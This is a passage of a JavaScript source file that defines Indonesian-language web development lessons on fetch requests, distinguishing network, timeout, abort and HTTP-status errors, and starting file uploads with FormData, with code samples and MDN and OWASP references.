            'Karakter khusus dari pengguna merusak artinya, dan nilai kosong ikut terkirim. Pakai `URLSearchParams`',
          ],
          [
            'Memanggil `fetch` langsung di banyak berkas',
            'Satu baris saja, tidak perlu pembungkus',
            'Pemeriksaan status, header, dan penanganan galat harus diulang di tiap tempat, dan satu pun yang terlewat menjadi bug. Buat satu pembungkus, seperti di Sub-bab 5.11',
          ],
          [
            'Melupakan `await` pada `respons.json()`',
            'Barisnya sudah di dalam fungsi `async`',
            '`json()` juga mengembalikan janji, jadi tanpa `await` kamu memegang janji bukan datanya. Gejalanya `[object Promise]` atau properti yang selalu `undefined`',
          ],
          [
            'Menyetel `Content-Type` untuk `FormData`',
            'Semua permintaan lain butuh headernya',
            'Justru merusaknya, sebab pembatas antar-bagian hilang',
          ],
          [
            'Membaca respons sebagai JSON tanpa memeriksa statusnya',
            'Servernya kan selalu mengirim JSON',
            'Halaman galat dan pengalihan mengirim HTML, dan responsnya kosong pada 204. Periksa status lebih dulu',
          ],
          [
            'Mengirim seluruh object pengguna sebagai badan permintaan',
            'Servernya tinggal mengambil yang perlu',
            'Ikut mengirim field yang tidak seharusnya, dan sebagian server menerima apa saja yang dikirim. Kirim hanya field yang memang diubah',
          ],
        ],
      ),
      p(
        'Baris keenam adalah kebiasaan yang berubah menjadi celah keamanan di sisi server. Kalau klien mengirim seluruh object pengguna termasuk `peranId`, dan server memperbarui seluruh kolom yang dikirim, maka pengguna biasa bisa menjadikan dirinya admin hanya dengan menyunting badan permintaan. Ini disebut mass assignment, dan pertahanannya ada di server. Tetap saja, mengirim hanya yang perlu adalah kebiasaan yang membuat celah itu tidak pernah tergoda dibuka.',
      ),
      callout(
        'info',
        'Opsi `fetch` yang jarang dipakai dan sesekali menyelamatkan',
        "`cache: 'no-store'` memaksa mengabaikan cache, berguna untuk data yang harus selalu segar. `redirect: 'manual'` mencegah mengikuti pengalihan otomatis, berguna untuk mendeteksi sesi habis. `keepalive: true` membuat permintaan tetap terkirim walaupun halaman ditutup, berguna untuk mengirim analitik terakhir. Ketiganya jarang, dan mengetahuinya ada sudah cukup.",
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Pakai `URL` + `searchParams`; jangan merangkai query dengan string.',
        'POST JSON butuh `JSON.stringify` **dan** header `Content-Type`.',
        'Body respons hanya bisa dibaca sekali — `clone()` kalau butuh dua kali.',
        'Periksa `content-type` sebelum `res.json()` supaya pesan errornya jujur.',
        '`204 No Content` tidak punya body — jangan panggil `res.json()` untuknya.',
      ),
      references(
        {
          label: 'fetch()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/fetch',
          source: 'MDN',
          note: 'Seluruh opsi permintaan: `method`, `headers`, `body`, `credentials`, dan `signal`.',
        },
        {
          label: 'Response',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Response',
          source: 'MDN',
          note: 'Menegaskan bahwa badan jawaban hanya bisa dibaca sekali, beserta `clone()` sebagai jalan keluar.',
        },
        {
          label: 'URLSearchParams',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams',
          source: 'MDN',
          note: 'Menyusun query string dengan pengkodean otomatis — pengganti penyambungan teks.',
        },
        {
          label: 'Headers',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Headers',
          source: 'MDN',
          note: 'Termasuk aturan jangan menulis `Content-Type` sendiri saat memakai `FormData`.',
        },
        {
          label: '204 No Content',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204',
          source: 'MDN',
          note: 'Alasan `res.json()` tidak boleh dipanggil untuk status ini.',
        },
      ),
    ],
  ),

  written(
    'error-fetch',
    'Menangani Error di `fetch`',
    24,
    'Kesalahan paling umum: mengira 404 akan masuk ke `catch`.',
    [
      p(
        'Ini sub-bab pendek dengan dampak besar. Satu salah paham di sini membuat aplikasi menampilkan "berhasil" padahal server menolak permintaannya.',
      ),

      terms(
        {
          term: 'res.ok',
          meaning:
            'Property boolean yang bernilai `true` **hanya** untuk status 200–299. Inilah pemeriksaan yang wajib kamu tulis sendiri setelah setiap `fetch`. Melewatkannya adalah kesalahan nomor satu di sub-bab ini, dan akibatnya aplikasi menampilkan "berhasil" padahal server menolak.',
        },
        {
          term: 'menolak (reject)',
          meaning:
            'Promise yang berakhir gagal sehingga masuk ke `catch`. Aturan `fetch` konsisten dan perlu dihafal: ia menolak **hanya kalau jawabannya tidak sampai** — jaringan mati, DNS gagal, dibatalkan, atau diblokir CORS. Begitu server menjawab, apa pun isinya, permintaannya dianggap berhasil dilakukan.',
        },
        {
          term: 'TypeError',
          meaning:
            'Jenis error yang dilempar `fetch` saat permintaan **tidak sampai sama sekali**. Sayangnya pesannya sengaja dibuat kabur ("Failed to fetch") demi keamanan — browser tidak ingin membocorkan apakah kegagalannya karena jaringan, DNS, atau CORS.',
        },
        {
          term: 'error jaringan',
          meaning:
            'Kegagalan sebelum jawaban sempat tiba: koneksi putus, server tidak dapat dihubungi, permintaan diblokir. Bedakan dari **error aplikasi** seperti `404` atau `422` — yang pertama layak dicoba ulang, yang kedua tidak.',
        },
        {
          term: 'error terstruktur',
          meaning:
            'Objek `Error` buatanmu yang **membawa keterangan tambahan** selain pesan — `status`, `kode`, atau isi jawaban server. Tanpa itu, pemanggil hanya punya teks untuk dicocokkan, dan pencocokan teks selalu rapuh.',
        },
        {
          term: 'error.cause',
          meaning:
            'Property baku untuk **menyimpan error asal** saat kamu membungkusnya dengan error baru: `new Error("Gagal memuat", { cause: e })`. Tanpa itu, jejak penyebab sebenarnya hilang begitu error dibungkus ulang.',
        },
        {
          term: 'pesan yang bisa ditindaklanjuti',
          meaning:
            'Pesan error yang memberi tahu pengguna **apa yang bisa ia lakukan**, bukan sekadar menyatakan ada yang salah. "Periksa koneksi lalu coba lagi" bisa ditindaklanjuti; "Terjadi kesalahan" tidak. Aturan pendampingnya dari `security.md`: detail teknis tetap di log, jangan di layar.',
        },
        {
          term: 'graceful degradation',
          meaning:
            'Terjemahannya **penurunan yang anggun**. Aplikasi tetap berguna meski sebagian gagal — misalnya menampilkan data lama dari cache sambil memberi tahu bahwa pembaruan gagal, alih-alih menampilkan layar kosong.',
        },
      ),

      h2('Kapan `fetch` menolak'),
      table(
        ['Kejadian', '`fetch` menolak?'],
        [
          ['Jaringan mati, DNS gagal, koneksi ditolak', '**Ya** — `TypeError`'],
          ['Dibatalkan `AbortController`', '**Ya** — `AbortError`'],
          ['Habis waktu `AbortSignal.timeout`', '**Ya** — `TimeoutError`'],
          ['Diblokir CORS', '**Ya** — `TypeError`'],
          ['Server balas `404`', '**Tidak** — dianggap berhasil diterima'],
          ['Server balas `500`', '**Tidak**'],
        ],
      ),
      p(
        'Logikanya konsisten, karena `fetch` menolak kalau **responsnya tidak sampai**. Kalau server menjawab, apa pun jawabannya, permintaannya berhasil dilakukan.',
      ),
      code(
        'js',
        `
        // SALAH: catch tidak akan pernah menangkap 404 atau 500
        try {
          const data = await fetch('/api/tidak-ada').then((r) => r.json());
          tampilkan(data);
        } catch (e) {
          tampilkanError(e);
        }
        `,
      ),
      code(
        'js',
        `
        // BENAR
        const res = await fetch('/api/tidak-ada');
        if (!res.ok) {
          throw new Error(\`Server balas \${res.status}\`);
        }
        `,
      ),
      p(
        'Versi SALAH punya `try`/`catch` yang lengkap dan terlihat bertanggung jawab, dan justru itu yang membuatnya berbahaya. Pada `404`, `fetch` tidak menolak sehingga `catch` tidak terpicu. Yang terjadi adalah `r.json()` mencoba mengurai body halaman error, dan hasilnya bisa dua-duanya salah. Ia bisa melempar `SyntaxError` yang menyesatkan, atau kalau server mengirim JSON berisi keterangan error, ia **berhasil diurai** lalu diteruskan ke `tampilkan(data)` seolah-olah itu data yang sah. Kasus kedua yang paling buruk, karena tidak ada satu pun tanda bahwa ada yang gagal. Versi BENAR menyisipkan pemeriksaan `res.ok` **sebelum** body dibaca sama sekali, dan mengubah status gagal menjadi error yang dilempar, sehingga `catch` di pemanggil akhirnya benar-benar berfungsi seperti yang kamu harapkan.',
      ),

      h2('Membedakan tiga jenis kegagalan'),
      code(
        'js',
        `
        async function ambil(url) {
          let res;

          try {
            res = await fetch(url, { signal: AbortSignal.timeout(10_000) });
          } catch (error) {
            if (error.name === 'AbortError') throw error;        // dibatalkan sengaja
            if (error.name === 'TimeoutError') {
              throw new Error('Server tidak menjawab. Periksa koneksimu.');
            }
            // TypeError: jaringan mati, DNS gagal, atau diblokir CORS
            throw new Error('Tidak bisa terhubung ke server.');
          }

          if (!res.ok) {
            const pesan = await pesanDariServer(res);
            const error = new Error(pesan ?? \`Server balas \${res.status}\`);
            error.status = res.status;
            throw error;
          }

          return res.json();
        }

        async function pesanDariServer(res) {
          try {
            const tipe = res.headers.get('content-type') ?? '';
            if (!tipe.includes('json')) return null;
            const body = await res.json();
            return body?.message ?? body?.error ?? null;
          } catch {
            return null;      // body rusak — jangan sampai ini menutupi error aslinya
          }
        }
        `,
      ),
      p(
        'Perhatikan `try` di sini **hanya membungkus baris `fetch`** dan bukan seluruh isi fungsi, dan itu disengaja. Blok itu khusus menangani kegagalan yang membuat respons tidak pernah sampai, dan ketiganya dibedakan karena artinya berbeda bagi pengguna. `AbortError` berarti kita sendiri yang membatalkan, sehingga dilempar ulang apa adanya tanpa pesan. `TimeoutError` berarti server terlalu lambat. Sedangkan `TypeError`, yang namanya sama sekali tidak menyiratkan jaringan, adalah yang kamu terima saat koneksi mati, DNS gagal, atau permintaan diblokir CORS. Setelah blok itu lewat, respons sudah pasti ada, sehingga `!res.ok` bisa ditangani terpisah. Baris `error.status = res.status` menempelkan status ke objek error, dan itulah yang nanti dipakai pemanggil untuk membedakan `404` dari kegagalan lain.',
      ),
      p(
        'Fungsi `pesanDariServer` di bawahnya ada untuk satu tujuan, yaitu **memakai pesan yang sudah disediakan server** kalau ada, alih-alih selalu menampilkan "Server balas 422" yang tidak berarti apa-apa bagi pengguna. Ia memeriksa `content-type` lebih dulu supaya tidak mengurai halaman HTML, lalu mencoba dua nama field yang paling lazim (`message` dan `error`) dengan `??`. Yang paling penting justru `catch` kosongnya, karena kalau body ternyata rusak, fungsi ini mengembalikan `null` dan **tidak melempar apa pun**. Error dari usaha membaca pesan tidak boleh menggantikan error asli yang sedang kamu tangani, sebab kegagalan saat menangani kegagalan adalah cara paling efektif menghilangkan jejak masalah sebenarnya.',
      ),
      callout(
        'warning',
        'Perbedaan yang membingungkan saat menguji',
        '`AbortSignal.timeout()` hanya melempar `TimeoutError` kalau waktunya benar-benar habis. Kalau koneksi **ditolak lebih dulu** (server mati, port salah), yang kamu terima adalah `TypeError` — bukan `TimeoutError`. Diverifikasi langsung saat menulis materi ini.',
      ),

      h2('Pesan untuk pengguna vs pesan untuk log'),
      code(
        'js',
        `
        catch (error) {
          // Log: lengkap, untuk kamu
          console.error('[ambilTugas] gagal', { url, status: error.status, error });

          // Layar: bisa ditindaklanjuti, tanpa detail internal
          tampilkanError(
            error.status === 404
              ? 'Data tidak ditemukan.'
              : 'Gagal memuat data. Coba muat ulang halaman.',
          );
        }
        `,
      ),
      p(
        'Satu `catch`, dua pembaca yang berbeda, dan itu pembagian yang layak dijadikan kebiasaan. Baris `console.error` ditujukan untukmu saat menelusuri masalah, jadi ia memuat **semua**, mulai dari alamat yang dipanggil, status yang diterima, sampai objek error utuh beserta jejak tumpukannya. Awalan `[ambilTugas]` membuatnya bisa disaring di antara log dari bagian lain aplikasi. Bagian `tampilkanError` ditujukan untuk pengguna, dan isinya dipilih berdasarkan `error.status` yang tadi ditempelkan. `404` mendapat kalimatnya sendiri karena artinya jelas dan tidak menakutkan, sedangkan sisanya diseragamkan menjadi satu pesan yang **menyebutkan tindakan berikutnya**. Perhatikan tidak ada satu pun bagian dari `error.message` yang bocor ke layar, karena isinya ditentukan server dan bisa memuat jalur berkas atau nama tabel yang tidak perlu diketahui siapa pun.',
      ),
      callout(
        'danger',
        'Jangan tampilkan pesan error mentah ke pengguna',
        'Stack trace dan pesan internal bisa membocorkan jalur berkas, nama tabel, dan versi library — informasi berharga bagi penyerang. Detail ke log; pesan yang bisa ditindaklanjuti ke layar.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman checkout memanggil empat endpoint. Setelah dipakai sebulan, tim dukungan melaporkan tiga jenis keluhan yang semuanya berbunyi sama, yaitu tombolnya tidak melakukan apa-apa. Setelah ditelusuri, ketiganya ternyata masalah yang berbeda, yaitu jaringan pengguna terputus, sesi mereka habis, dan satu endpoint sedang mati. Ketiganya menghasilkan layar yang sama karena kodenya menangani semuanya dengan satu `catch` yang mencetak ke console.',
      ),
      p(
        'Yang dibutuhkan bukan lebih banyak penanganan galat melainkan penanganan yang **membedakan**. Tabel berikut memetakan tiap jenis kegagalan ke tindakan yang berbeda, dan pemetaan itulah inti sub-bab ini.',
      ),
      table(
        ['Jenis kegagalan', 'Cara mengenalinya', 'Apa yang harus terjadi di layar'],
        [
          [
            'Jaringan terputus',
            '`fetch` melempar `TypeError`',
            'Banner dapat dicoba lagi, dan simpan isian pengguna',
          ],
          [
            'Kehabisan waktu',
            "`galat.name === 'TimeoutError'`",
            'Sama seperti di atas, dengan pesan yang menyebut lambat',
          ],
          [
            'Dibatalkan sendiri',
            "`galat.name === 'AbortError'`",
            '**Tidak ada.** Ini bukan kegagalan',
          ],
          [
            'Sesi habis (401)',
            '`respons.status === 401`',
            'Arahkan ke halaman masuk, simpan tujuan awalnya',
          ],
          [
            'Tidak berhak (403)',
            '`respons.status === 403`',
            'Pesan tegas, dan **jangan** arahkan ke halaman masuk',
          ],
          ['Data tidak sah (422)', '`respons.status === 422`', 'Sorot kolom yang disebut server'],
          [
            'Server bermasalah (5xx)',
            '`respons.status >= 500`',
            'Pesan bahwa ini masalah kami, dan catat ke pemantauan',
          ],
        ],
        'Tujuh jenis, tujuh tindakan berbeda. Satu `catch` untuk semuanya membuang informasi ini.',
      ),
      code(
        'js',
        `
        export async function ambilJson(alamat, opsi = {}) {
          let respons;

          try {
            respons = await fetch(alamat, {
              ...opsi,
              signal: opsi.signal ?? AbortSignal.timeout(10_000),
            });
          } catch (penyebab) {
            // Hanya kegagalan jaringan dan pembatalan yang sampai ke sini.
            if (penyebab.name === 'AbortError') throw penyebab;      // teruskan apa adanya
            if (penyebab.name === 'TimeoutError') {
              throw new ErrorJaringan('Permintaan terlalu lama', { cause: penyebab });
            }
            throw new ErrorJaringan('Tidak bisa menghubungi server', { cause: penyebab });
          }

          if (respons.status === 204) return null;
          if (respons.status === 401) throw new ErrorSesi();
          if (respons.status === 403) throw new ErrorAkses();
          if (respons.status === 422) {
            const isi = await respons.json().catch(() => ({}));
            throw new ErrorValidasi(isi.pesan ?? 'Data tidak sah', isi.field);
          }
          if (respons.status >= 500) throw new ErrorServer(respons.status);
          if (!respons.ok) throw new Error(\`Status tak terduga \${respons.status}\`);

          return respons.json();
        }
        `,
        { filename: 'src/api/ambil-json.js' },
      ),
      p(
        'Pemisahan `try` yang hanya membungkus `fetch` itu disengaja dan penting. Karena `fetch` hanya melempar untuk kegagalan jaringan dan pembatalan, blok `catch` itu tidak akan pernah menangkap kesalahan lain, sehingga penanganannya bisa tegas tanpa perlu memeriksa jenis lain. Seluruh pemeriksaan status berada di luar `try`, tempat ia lebih mudah dibaca sebagai daftar aturan.',
      ),
      p(
        'Baris `await respons.json().catch(() => ({}))` menutup kasus yang sering terlewat, yaitu server yang menjawab 422 dengan badan kosong atau badan yang bukan JSON. Tanpa `catch` itu, upaya membaca keterangan kolom justru melempar `SyntaxError` yang menggantikan kesalahan aslinya, dan pengguna melihat pesan yang sama sekali tidak berhubungan.',
      ),
      p(
        'Perhatikan `AbortError` diteruskan apa adanya, bukan dibungkus. Pembatalan bukan kegagalan melainkan hasil dari keputusan kodemu sendiri, misalnya pengguna mengetik kata pencarian baru. Membungkusnya sebagai `ErrorJaringan` akan membuat lapisan atas menampilkan banner kesalahan setiap kali pengguna mengetik satu huruf lagi.',
      ),
      code(
        'js',
        `
        // Di lapisan tampilan, tiap jenis mendapat perlakuan sendiri.
        try {
          const data = await ambilJson('/api/checkout', { method: 'POST', body });
          tampilkanBerhasil(data);
        } catch (galat) {
          if (galat.name === 'AbortError') return;                  // diam
          if (galat instanceof ErrorValidasi) return sorotKolom(galat.field, galat.message);
          if (galat instanceof ErrorSesi) return keHalamanMasuk({ kembaliKe: location.pathname });
          if (galat instanceof ErrorAkses) return tampilkanPesan('Kamu tidak berhak melakukan ini');
          if (galat instanceof ErrorJaringan) return tampilkanBannerCobaLagi(galat.message);
          if (galat instanceof ErrorServer) {
            laporkanKePemantauan(galat);
            return tampilkanPesan('Ada gangguan di sisi kami. Tim sudah diberi tahu.');
          }
          laporkanKePemantauan(galat);
          throw galat;                                              // yang tak dikenal, lempar
        }
        `,
        { filename: 'src/checkout/kirim.js' },
      ),
      p(
        'Baris terakhir sebelum penutup adalah yang paling sering hilang. Setiap kegagalan yang tidak masuk salah satu kategori adalah sesuatu yang belum kamu pahami, dan menelannya berarti mengubah bug yang bisa diperbaiki menjadi perilaku aneh tanpa jejak. Melemparnya kembali membuatnya sampai ke jaring pengaman terakhir dan tercatat, dan itu satu-satunya cara kamu akan tahu kategori kedelapan yang belum terpikirkan.',
      ),
      callout(
        'warning',
        'Jangan tampilkan `galat.message` mentah kepada pengguna',
        'Pesan teknis bisa memuat nama tabel, jalur berkas, versi pustaka, atau bagian dari kueri. Ketiganya berguna bagi penyerang dan tidak berguna bagi pengguna. Tampilkan pesan yang sudah kamu tulis sendiri untuk tiap kategori, dan simpan pesan teknisnya di log server lewat `cause`.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut diuji langsung terhadap server sungguhan, dan keempatnya menuntut penanganan yang berbeda.',
      ),
      code(
        'text',
        `
        const r = await fetch('/api/500');
        const data = await r.json();

        SyntaxError: Unexpected token 'b', "boom" is not valid JSON
        `,
        { caption: 'Server 500 mengirim teks biasa, bukan JSON.' },
      ),
      p(
        'Inilah akibat langsung dari membaca badan sebelum memeriksa status. Kesalahan aslinya adalah server bermasalah, dan yang sampai ke penanganmu justru `SyntaxError` yang menyebut huruf b. Informasi bahwa statusnya 500 hilang sepenuhnya. Ini alasan pemeriksaan status selalu mendahului pembacaan badan, dan bukan sebaliknya.',
      ),
      code(
        'text',
        `
        await fetch('http://127.0.0.1:9/x');

        TypeError: fetch failed
          cause: bad port
        `,
        { caption: 'Kegagalan jaringan membawa penyebab teknis di properti `cause`.' },
      ),
      p(
        'Di Node.js, properti `cause` berisi kesalahan asli dari lapisan jaringan, dan kodenya seperti `ENOTFOUND`, `ECONNREFUSED`, atau `bad port` sangat membantu saat menelusuri. Di peramban, informasi itu sengaja tidak disediakan demi keamanan, sehingga seluruh kegagalan jaringan terlihat sama. Untuk kode yang berjalan di kedua tempat, catat `cause` kalau ada dan jangan mengandalkannya.',
      ),
      code(
        'text',
        `
        await fetch('/api/lambat', { signal: AbortSignal.timeout(300) });

        TimeoutError: The operation was aborted due to timeout
        `,
        { caption: 'Kehabisan waktu punya nama sendiri, terpisah dari pembatalan biasa.' },
      ),
      p(
        'Perbedaan `TimeoutError` dan `AbortError` menentukan tindakan yang berlawanan. Kehabisan waktu berarti ada masalah nyata yang perlu diberitahukan beserta tombol coba lagi. Pembatalan berarti kodemu sendiri yang menghentikannya, dan pengguna tidak boleh melihat apa pun. Memeriksa lewat `galat.name` adalah cara yang benar, sebab mencocokkan teks pesannya berbeda antar-peramban.',
      ),
      code(
        'text',
        `
        try {
          const r = await fetch(alamat);
          const data = await r.json();
        } catch (e) {
          console.error(e);
        }

        // Pengguna tidak melihat apa pun. Halaman tetap kosong selamanya.
        `,
        { caption: 'Penanganan yang hanya mencatat adalah bentuk lain dari menelan.' },
      ),
      p(
        'Ini bukan error melainkan pola yang paling sering ditemui dan paling merugikan. Kegagalannya memang tercatat, tapi tidak ada satu pun konsekuensi yang terlihat pengguna. Indikator memuat tetap berputar, atau halaman tetap kosong tanpa penjelasan. Setiap `catch` harus menjawab satu pertanyaan, yaitu apa yang dilihat pengguna sekarang, dan mencetak ke console bukan jawabannya.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`SyntaxError` pada respons 500',
            'Badan dibaca sebelum status diperiksa',
            'Periksa status lebih dulu, lalu baca badannya',
          ],
          [
            '`TypeError: fetch failed` dengan `cause`',
            'Kegagalan jaringan sungguhan',
            'Tampilkan banner dapat dicoba lagi, dan catat `cause`',
          ],
          [
            '`TimeoutError` melawan `AbortError`',
            'Yang pertama masalah nyata, yang kedua keputusanmu sendiri',
            'Bedakan lewat `galat.name`, dan diamkan yang kedua',
          ],
          [
            'Halaman kosong tanpa pesan apa pun',
            '`catch` hanya mencetak ke console',
            'Tiap `catch` harus mengubah sesuatu yang dilihat pengguna',
          ],
          [
            'Pesan teknis muncul di layar pengguna',
            '`galat.message` ditampilkan mentah',
            'Tampilkan pesan yang kamu tulis per kategori',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Penanganan galat sering ditambahkan belakangan sebagai formalitas, dan hasilnya kode yang terlihat aman tapi berperilaku sama saja dengan yang tidak menanganinya.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Satu `catch` untuk seluruh jenis kegagalan',
            'Semuanya kan sama-sama gagal',
            'Pengguna yang salah mengetik email melihat pesan gangguan server. Tujuh jenis kegagalan menuntut tujuh tindakan berbeda',
          ],
          [
            'Menganggap `fetch` melempar untuk 404 dan 500',
            'Keduanya jelas kegagalan',
            '`fetch` hanya melempar kalau permintaannya tidak sampai. Periksa `respons.ok` sendiri',
          ],
          [
            'Membaca badan respons sebelum memeriksa statusnya',
            'Urutannya terasa alami',
            'Kesalahan asli tergantikan `SyntaxError` dari penguraian, dan informasi statusnya hilang',
          ],
          [
            'Memperlakukan `AbortError` sebagai kegagalan',
            'Ia memang error yang dilempar',
            'Pengguna melihat pesan gagal setiap kali ia mengetik lebih lanjut di kotak pencarian',
          ],
          [
            'Mengarahkan ke halaman masuk untuk 403',
            'Keduanya soal izin',
            '403 berarti sistem sudah tahu siapa kamu dan tetap menolak. Masuk ulang tidak mengubah apa pun, dan pengguna berputar tanpa jalan keluar',
          ],
          [
            'Tidak melempar ulang kegagalan yang tidak dikenali',
            'Sudah ditangani semuanya',
            'Kategori yang belum terpikirkan menjadi tidak terlihat selamanya. Lempar ulang supaya tercatat dan bisa ditambahkan nanti',
          ],
        ],
      ),
      p(
        'Baris keempat perlu ditegaskan karena ia sangat sering luput dari pengujian. Pembatalan hanya terjadi kalau pengguna melakukan sesuatu dengan cepat, misalnya mengetik beberapa huruf berturut-turut atau berpindah halaman sebelum data selesai dimuat. Di pengujian manual yang tenang, keadaan itu hampir tidak pernah tercapai. Ujilah dengan mengetik cepat di kotak pencarian sambil melihat console.',
      ),
      callout(
        'tip',
        'Satu pertanyaan yang membuat penanganan galat berguna',
        'Untuk tiap `catch` yang kamu tulis, jawab pertanyaan ini, yaitu apa yang dilihat pengguna sepersekian detik setelah baris ini berjalan. Kalau jawabannya sama dengan sebelum kegagalan terjadi, penangananmu belum selesai. Jawaban yang sah termasuk pesan galat, keadaan kosong dengan penjelasan, tombol coba lagi, atau perpindahan halaman.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        '`fetch` hanya menolak kalau responsnya tidak sampai — 404 dan 500 dianggap berhasil.',
        'Selalu periksa `res.ok` sebelum membaca body.',
        'Bedakan `AbortError`, `TimeoutError`, dan `TypeError` — ketiganya butuh perlakuan berbeda.',
        'Koneksi yang ditolak memberi `TypeError`, bukan `TimeoutError`.',
        'Detail lengkap ke log; pesan yang bisa ditindaklanjuti ke layar.',
      ),
      references(
        {
          label: 'Response.ok',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Response/ok',
          source: 'MDN',
          note: 'Pemeriksaan wajib setelah setiap `fetch` — inti seluruh sub-bab ini.',
        },
        {
          label: 'Using the Fetch API — Checking that the fetch was successful',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch',
          source: 'MDN',
          note: 'Penegasan resmi bahwa `fetch` hanya menolak saat jawaban tidak sampai.',
        },
        {
          label: 'Error: cause',
          href: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause',
          source: 'MDN',
          note: 'Menyimpan error asal saat membungkusnya, agar jejak penyebab tidak hilang.',
        },
        {
          label: 'TypeError',
          href: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypeError',
          source: 'MDN',
          note: 'Jenis error yang dilempar `fetch` saat permintaan tidak sampai sama sekali.',
        },
        {
          label: 'Error Handling Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Alasan keamanan di balik "detail ke log, pesan generik ke layar".',
        },
      ),
    ],
  ),

  written(
    'upload-file',
    'Upload Berkas: `FormData` & multipart',
    22,
    'Mengirim berkas dari browser — dan kenapa validasi klien bukan pengaman.',
    [
      terms(
        {
          term: 'File',
          meaning:
            'Objek yang mewakili satu berkas yang dipilih pengguna, berisi `name`, `size`, `type`, dan `lastModified`. Peringatan yang wajib melekat: **`type` berasal dari klien dan bisa dipalsukan** — mengganti nama `virus.exe` menjadi `foto.jpg` sudah cukup untuk mengelabuinya.',
        },
        {
          term: 'FileList',
          meaning:
            'Kumpulan berkas pada `input.files`. Seperti `NodeList`, ia **mirip array tapi bukan array** — sebarkan dengan `[...input.files]` kalau butuh `map` atau `filter`.',
        },
        {
          term: 'FormData',
          meaning:
            'Objek yang menyusun badan pesan `multipart/form-data`, satu-satunya format yang bisa membawa **berkas dan teks sekaligus**. Aturan mutlaknya: **jangan pernah menulis header `Content-Type` sendiri** saat memakainya — browser harus menyusunnya sendiri agar bisa menyisipkan penanda pembatas yang benar.',
        },
        {
          term: 'multipart',
          meaning:
            'Terjemahannya **berbagai bagian**. Format badan pesan yang memisahkan tiap potongan data dengan penanda pembatas unik, sehingga berkas biner dan teks bisa dikirim dalam satu permintaan tanpa saling merusak.',
        },
        {
          term: 'boundary',
          meaning:
            'Terjemahannya **pembatas**. Untai teks acak yang memisahkan tiap bagian di dalam badan `multipart`. Nilainya harus dijamin tidak muncul di dalam isi berkas — dan justru karena itulah browser yang harus membuatnya, bukan kamu.',
        },
        {
          term: 'MIME type',
          meaning:
            'Singkatan *Multipurpose Internet Mail Extensions*. Penanda jenis berkas seperti `image/jpeg` atau `application/pdf`. Asal-usulnya memang dari email, tapi kini dipakai di seluruh web untuk menyatakan format sebuah data.',
        },
        {
          term: 'magic bytes',
          meaning:
            'Terjemahannya **byte penanda**. Beberapa byte pertama sebuah berkas yang menyatakan jenis aslinya — misalnya berkas PNG selalu diawali `89 50 4E 47`. Inilah cara **server** memeriksa jenis berkas yang sebenarnya, karena ia tidak bisa dipalsukan hanya dengan mengganti nama.',
        },
        {
          term: 'accept',
          meaning:
            'Atribut pada `<input type="file">` yang **menyaring pilihan di dialog** berkas, misalnya `accept="image/*"`. Perlu ditegaskan: ini murni kenyamanan — ia sama sekali tidak mencegah pengguna memilih berkas lain lewat cara lain.',
        },
        {
          term: 'validasi klien vs server',
          meaning:
            'Pemeriksaan di browser membuat pengguna dapat jawaban seketika; pemeriksaan di server **satu-satunya yang mengamankan**. Untuk unggahan, server wajib memeriksa ukuran, jenis berkas dari magic bytes, dan menyimpannya dengan nama yang ia buat sendiri — bukan nama dari klien.',
        },
        {
          term: 'objectURL',
          meaning:
            'Alamat sementara berbentuk `blob:` yang dibuat `URL.createObjectURL(file)` untuk menampilkan pratinjau tanpa mengunggah apa pun. Wajib dilepas dengan `URL.revokeObjectURL(...)` setelah selesai, kalau tidak berkasnya tertahan di memori.',
        },
      ),

      h2('Memilih berkas'),
      code('html', `<input type="file" id="berkas" accept="image/*" multiple />`),
      code(
        'js',
        `
        const input = document.querySelector('#berkas');

        input.addEventListener('change', () => {
          for (const file of input.files) {
            file.name;            // 'foto.jpg'
            file.size;            // dalam byte
            file.type;            // 'image/jpeg' — DARI KLIEN, bisa dipalsukan
            file.lastModified;
          }
        });
        `,
      ),
      p(
        'Perhatikan `input.files` ditelusuri dengan `for...of` meski hanya ada satu berkas — karena atribut `multiple` di HTML membuatnya selalu berupa koleksi, bahkan saat isinya satu. Peristiwa yang didengarkan adalah `change`, yang terpicu setelah pengguna menutup dialog pemilihan berkas. Keempat property yang dibaca datang **sepenuhnya dari komputer pengguna**, dan komentar pada `file.type` menandai yang paling menyesatkan: nilainya ditebak browser dari **ekstensi nama berkas**, bukan dari isinya. Mengganti nama `virus.exe` menjadi `foto.jpg` sudah cukup membuat `file.type` melaporkan `image/jpeg`. Karena itu keempatnya berguna untuk memberi feedback cepat kepada pengguna, dan tidak satu pun bisa dijadikan dasar keputusan keamanan.',
      ),

      h2('Mengunggah'),
      code(
        'js',
        `
        const fd = new FormData();
        fd.append('judul', 'Foto profil');
        fd.append('berkas', input.files[0]);

        const res = await fetch('/api/unggah', {
          method: 'POST',
          body: fd,          // JANGAN set Content-Type sendiri
        });
        `,
      ),
      p(
